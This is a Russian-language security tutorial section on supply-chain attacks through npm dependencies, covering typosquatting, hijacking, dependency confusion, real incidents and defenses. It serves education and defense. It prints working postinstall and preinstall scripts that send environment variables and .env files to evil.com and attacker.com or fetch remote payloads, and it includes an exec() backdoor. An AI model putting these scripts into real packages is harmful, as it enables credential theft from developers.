## 4. Insecure Dependencies (Supply Chain Attacks)

### Что это такое

Insecure Dependencies — это уязвимость, при которой приложение использует сторонние библиотеки, пакеты или компоненты, содержащие известные уязвимости безопасности или вредоносный код. Supply Chain атаки эксплуатируют доверие разработчиков к экосистеме открытого ПО, внедряя компрометированный код в популярные пакеты, которые затем используются тысячами приложений.

**CVSS Score:** 7.0 - 10.0 (в зависимости от типа уязвимости)
**CWE ID:** CWE-1104, CWE-829, CWE-506
**OWASP Top 10:** A06:2021 – Vulnerable and Outdated Components

### Как работает механизм атаки

Supply Chain атаки на уровне dependencies происходят несколькими путями:

1. **Compromised Package:** Злоумышленник получает контроль над легитимным популярным пакетом
2. **Malicious Update:** Вредоносный код внедряется в новую версию пакета
3. **Automatic Installation:** Разработчики автоматически обновляются (`npm install`, `npm update`)
4. **Silent Execution:** Вредоносный код выполняется при установке (postinstall scripts) или runtime
5. **Mass Compromise:** Тысячи приложений одновременно компрометированы

**Критическая особенность:** Одна скомпрометированная библиотека = тысячи зараженных приложений.

### Типы атак через dependencies

#### 4.1 Typosquatting

**Характеристики:**
- Создание пакета с именем похожим на популярный (опечатка)
- Расчет на невнимательность разработчиков
- Часто содержит вредоносный код в postinstall скриптах

**Примеры:**
```bash
# Легитимные пакеты vs typosquatting
react          →  raect, reatc
lodash         →  lodahs, loadash
express        →  exprss, expresss
axios          →  axois, axioss
webpack        →  webpak, wepback
```

**Вредоносный package.json:**
```json
{
  "name": "loadash",  // Опечатка в lodash
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node steal-secrets.js"
  }
}
```

**steal-secrets.js:**
```javascript
const fs = require('fs');
const https = require('https');

// Воровать environment variables
const secrets = process.env;

// Искать .env файлы
const envFiles = ['.env', '.env.local', '.env.production'];
envFiles.forEach(file => {
    if (fs.existsSync(file)) {
        secrets[file] = fs.readFileSync(file, 'utf8');
    }
});

// Отправить на сервер злоумышленника
https.request({
    hostname: 'evil.com',
    path: '/collect',
    method: 'POST'
}).end(JSON.stringify(secrets));
```

**Impact:** ВЫСОКИЙ - кража credentials при установке

#### 4.2 Package Hijacking

**Характеристики:**
- Компрометация maintainer аккаунта (phishing, credential stuffing)
- Публикация вредоносной версии легитимного пакета
- Использование доверия пользователей к пакету

**Механизм атаки:**
```
1. Популярный пакет "awesome-lib" с 5M downloads/week
2. Хакер получает доступ к npm аккаунту maintainer (фишинг)
3. Публикует версию 2.5.1 с вредоносным кодом
4. Разработчики обновляются: npm update
5. Вредоносный код выполняется в тысячах приложений
```

**Impact:** КРИТИЧЕСКИЙ - массовая компрометация

#### 4.3 Dependency Confusion

**Характеристики:**
- Эксплуатация приоритета между private и public репозиториями
- Публикация public пакета с тем же именем что и internal
- Package manager выбирает public версию с более высоким version number

**Пример атаки:**
```bash
# Компания использует internal пакет:
# @company/auth-lib версия 1.2.0 (в private registry)

# Злоумышленник публикует в public npm:
# @company/auth-lib версия 999.999.999

# npm install выбирает более высокую версию из public registry
# Вредоносный код установлен вместо легитимного
```

**Impact:** ВЫСОКИЙ - обход internal security

#### 4.4 Known Vulnerabilities

**Характеристики:**
- Использование устаревших версий библиотек с известными CVE
- Отсутствие регулярных обновлений
- Накопление технического долга безопасности

**Пример:**
```json
{
  "dependencies": {
    "lodash": "4.17.11",    // ❌ CVE-2019-10744 (Prototype Pollution)
    "jquery": "3.3.1",      // ❌ CVE-2020-11022, CVE-2020-11023 (XSS)
    "axios": "0.18.0",      // ❌ CVE-2019-10742 (SSRF)
    "minimist": "1.2.0"     // ❌ CVE-2020-7598 (Prototype Pollution)
  }
}
```

**Impact:** СРЕДНИЙ-ВЫСОКИЙ - известные векторы атаки

### Реальные кейсы с финансовым impact

#### event-stream (2018) - Bitcoin Theft Attempt

**Что произошло:**
Популярный npm пакет `event-stream` (2 миллиона загрузок/неделю) был передан новому maintainer, который добавил зависимость с вредоносным кодом.

**Механизм:**
```javascript
// Легитимный maintainer Dominic Tarr передал права "right9ctrl"
// Новый maintainer добавил зависимость: flatmap-stream

// В flatmap-stream был скрыт код:
const crypto = require('crypto');

// Код активировался только в production
if (process.env.NODE_ENV === 'production') {
    // Искал Bitcoin wallet приложения Copay
    const walletFile = findCopayWallet();

    if (walletFile) {
        // Воровал приватные ключи
        const privateKeys = extractKeys(walletFile);

        // Отправлял на сервер злоумышленника
        sendToAttacker(privateKeys);
    }
}
```

**Результат:**
- Targeting: Copay Bitcoin wallet (миллионы пользователей)
- Обнаружено: Через 2.5 месяца после внедрения
- Украдено: Точная сумма неизвестна (попытка предотвращена)
- Impact: 1.5 миллиона загрузок/неделю зараженной версии
- Доверие к npm ecosystem подорвано

**Урок:** Даже маленькие, популярные пакеты могут быть weaponized.

#### ua-parser-js (2021) - Cryptominer & Password Stealer

**Что произошло:**
npm аккаунт maintainer популярного пакета `ua-parser-js` (7-8 миллионов загрузок/неделю) был взломан. Три вредоносные версии опубликованы.

**Механизм:**
```json
// Зараженные версии:
// - 0.7.29
// - 0.8.0
// - 1.0.0

// package.json содержал:
{
  "scripts": {
    "preinstall": "node preinstall.js"
  }
}
```

**preinstall.js:**
```javascript
// Linux/Mac: криптомайнер
if (process.platform !== 'win32') {
    downloadAndRun('https://evil.com/jsextension');  // XMRig miner
}

// Windows: password stealer
if (process.platform === 'win32') {
    downloadAndRun('https://evil.com/create.dll');  // Credential harvester
}
```

**Результат:**
- Затронуто: Facebook, Microsoft, Amazon и тысячи других
- Период: Несколько часов до обнаружения
- Вредоносный код: Криптомайнер + password stealer
- npm быстро удалил зараженные версии
- Все компании вынуждены провести security audit

**Урок:** Даже короткая компрометация high-traffic пакета = массовое заражение.

#### Codecov Bash Uploader (2021) - $$$Millions в ротации секретов

**Что произошло:**
(Детали уже были в разделе Data Exposure, но здесь акцент на supply chain)

Bash uploader script модифицирован для кражи environment variables из CI/CD pipeline тысяч компаний.

**Результат (дополнительно):**
- HashiCorp: Полная ротация всех секретов ($$$)
- Twilio: Ротация production credentials ($$$)
- Rapid7: Emergency infrastructure audit ($$$)
- Monday.com: Compromised API keys ротированы ($$$)
- Суммарно: Миллионы долларов на ротацию и аудит

**Урок:** Supply chain через build tools = доступ ко всем секретам.

#### Equifax через Apache Struts (2017)

**Что произошло:**
(Также упоминалось в Data Exposure, но ключевой момент - dependency)

Equifax использовал устаревшую версию Apache Struts с известной критической уязвимостью CVE-2017-5638. Патч был доступен за 2 месяца.

**Результат:**
- **$1.4 миллиарда** - самая дорогая цена неупdate'а dependency
- 147 миллионов записей украдено
- CEO уволен

**Урок:** Один неупdate'нный dependency = катастрофа.

### Технические детали эксплуатации

#### Создание вредоносного npm пакета

**Полный пример:**
```javascript
// package.json
{
  "name": "malicious-package",
  "version": "1.0.0",
  "description": "Totally legitimate package",
  "main": "index.js",
  "scripts": {
    "preinstall": "node preinstall.js",
    "postinstall": "node postinstall.js"
  }
}

// preinstall.js - выполняется ДО установки
const https = require('https');
const os = require('os');

// Собираем информацию о системе
const info = {
    platform: os.platform(),
    hostname: os.hostname(),
    user: os.userInfo(),
    env: process.env,  // ВСЕ environment variables!
    cwd: process.cwd(),
    timestamp: new Date().toISOString()
};

// Отправляем злоумышленнику
const data = JSON.stringify(info);
const req = https.request({
    hostname: 'attacker.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
    }
});

req.write(data);
req.end();

// index.js - "легитимная" функциональность
module.exports = {
    // Предоставляем какую-то полезную функцию чтобы не вызывать подозрений
    helper: function() {
        return 'I am helpful!';
    },

    // Но также backdoor
    _internal: function(cmd) {
        require('child_process').exec(cmd);  // RCE!
    }
};
```

#### Поиск уязвимых dependencies

**Automated tools:**
```bash
# npm audit (встроенный)
npm audit
npm audit --json > audit-report.json

# Detailed report
npm audit --parseable | awk -F $'\t' '{print $2, $3, $4}' | column -t

# Fix известных уязвимостей
npm audit fix
npm audit fix --force  # Может сломать приложение!

# Snyk
snyk test
snyk monitor  # Continuous monitoring

# OWASP Dependency-Check
dependency-check --project "MyApp" --scan ./package.json
```

#### Анализ package перед установкой

**Проверка reputation:**
```bash
# npm info показывает метаданные
npm info <package-name>

# Важные параметры:
# - weekly downloads (популярность)
# - maintainers (кто имеет доступ)
# - последнее обновление (активно ли поддерживается)
# - dependencies (сколько зависимостей)
# - repository (есть ли GitHub)

# Проверка на GitHub
# - звезды (популярность)
# - issues (активность community)
# - commits (как часто обновляется)
# - maintainers (кто контрибьютит)
```

**Проверка содержимого перед установкой:**
```bash
# Скачать без установки
npm pack <package-name>

# Распаковать
tar -xzf <package-name>-<version>.tgz

# Проверить package.json на подозрительные скрипты
cat package/package.json | jq '.scripts'

# Искать сетевые вызовы
grep -r "https://" package/
grep -r "require('http')" package/
grep -r "child_process" package/
```

### Методы защиты

#### 1. Dependency Pinning

**Используйте точные версии:**
```json
{
  "dependencies": {
    // ❌ Опасно - автоматические обновления
    "lodash": "^4.17.0",  // Любая версия >= 4.17.0 < 5.0.0
    "axios": "~1.2.0",    // Любая версия >= 1.2.0 < 1.3.0

    // ✅ Безопасно - точная версия
    "lodash": "4.17.21",
    "axios": "1.2.3"
  }
}
```

**Используйте lock files:**
```bash
# package-lock.json (npm)
# yarn.lock (yarn)
# pnpm-lock.yaml (pnpm)

# ВСЕГДА коммитьте lock files!
# Они гарантируют reproducible builds
```

#### 2. Regular Auditing

**Автоматизация в CI/CD:**
```yaml
# .github/workflows/security.yml
name: Security Audit

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Run npm audit
        run: npm audit --audit-level=high

      - name: Run Snyk test
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          command: test
          args: --severity-threshold=high
```

#### 3. Subresource Integrity (SRI) для CDN

**Для внешних скриптов:**
```html
<!-- ❌ Без SRI - CDN может быть скомпрометирован -->
<script src="https://cdn.example.com/library.js"></script>

<!-- ✅ С SRI - браузер проверяет hash -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous">
</script>
```

**Генерация SRI hash:**
```bash
# Для локального файла
openssl dgst -sha384 -binary library.js | openssl base64 -A

# Или используйте online tool
# https://www.srihash.org/
```

#### 4. Private Package Registry

**Для sensitive internal пакетов:**
```bash
# Настройка .npmrc
@company:registry=https://npm.company.com/
//npm.company.com/:_authToken=${NPM_TOKEN}

# Публикация internal пакета
npm publish --registry https://npm.company.com/
```

**Защита от dependency confusion:**
```json
// package.json
{
  "publishConfig": {
    "registry": "https://npm.company.com/"
  }
}
```

#### 5. Minimize Dependencies

**Принцип:** Меньше зависимостей = меньше attack surface

```bash
# Анализ используемых зависимостей
npx depcheck

# Показывает:
# - Unused dependencies (можно удалить)
# - Missing dependencies (должны быть добавлены)

# Bundle analyzer для frontend
npx webpack-bundle-analyzer dist/stats.json
```

**Выбор легковесных альтернатив:**
```javascript
// ❌ moment.js (67.9 KB minified)
import moment from 'moment';

// ✅ date-fns (модульная, ~2-3 KB на функцию)
import { format } from 'date-fns';

// ❌ lodash (24 KB минимум, обычно больше)
import _ from 'lodash';

// ✅ Нативные методы или lodash-es (tree-shakeable)
import debounce from 'lodash-es/debounce';
```

#### 6. Code Review для зависимостей

**Проверка при добавлении:**
```bash
# Pre-commit hook (.husky/pre-commit)
#!/bin/sh

# Проверить изменения в package.json
if git diff --cached --name-only | grep -q "package.json"; then
    echo "📦 package.json изменен, запускаем audit..."
    npm audit --audit-level=moderate

    if [ $? -ne 0 ]; then
        echo "❌ npm audit обнаружил уязвимости!"
        exit 1
    fi
fi
```

#### 7. Dependency Review на Pull Requests

**GitHub Dependency Review Action:**
```yaml
# .github/workflows/dependency-review.yml
name: Dependency Review

on: [pull_request]

permissions:
  contents: read

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - uses: actions/dependency-review-action@v3
        with:
          fail-on-severity: moderate
```

### Как тестировать

#### 1. Audit существующих dependencies

```bash
# npm audit
npm audit

# Детальный report
npm audit --json > audit.json

# Только production dependencies
npm audit --production

# Specific severity level
npm audit --audit-level=high
```

#### 2. Проверка на устаревшие пакеты

```bash
# npm outdated
npm outdated

# Показывает:
# Package  Current  Wanted  Latest  Location
# lodash   4.17.11  4.17.21 4.17.21 myapp

# Interactive update
npx npm-check-updates -i
```

#### 3. License compliance проверка

```bash
# license-checker
npx license-checker --summary

# Проверка на problematic licenses
npx license-checker --onlyAllow "MIT;Apache-2.0;BSD-3-Clause"
```

#### 4. Runtime dependency analysis

```javascript
// Логирование всех require вызовов
const Module = require('module');
const originalRequire = Module.prototype.require;

Module.prototype.require = function(id) {
    console.log(`Requiring: ${id}`);
    return originalRequire.apply(this, arguments);
};

// Помогает обнаружить:
// - Неожиданные сетевые вызовы
// - Suspicious modules
// - Runtime injection
```

### Контрольный чеклист

**Для разработчиков:**
- [ ] Все dependencies закреплены на точных версиях
- [ ] package-lock.json / yarn.lock закоммичены
- [ ] `npm audit` проходит без high/critical уязвимостей
- [ ] Новые dependencies проверены (reputation, downloads, maintainers)
- [ ] SRI используется для всех CDN ресурсов
- [ ] Минимальное количество dependencies (principle of least privilege)
- [ ] Регулярное обновление dependencies (quarterly минимум)

**Для security review:**
- [ ] Dependency audit автоматизирован в CI/CD
- [ ] License compliance проверен
- [ ] Private registry для internal пакетов
- [ ] Dependency confusion защита настроена
- [ ] Code review включает проверку новых dependencies
- [ ] Incident response plan для compromised dependency

**Для infrastructure:**
- [ ] Snyk / Dependabot / Renovate настроен
- [ ] Automated PR для security updates
- [ ] Vulnerability alerting настроен
- [ ] Private package registry deployed

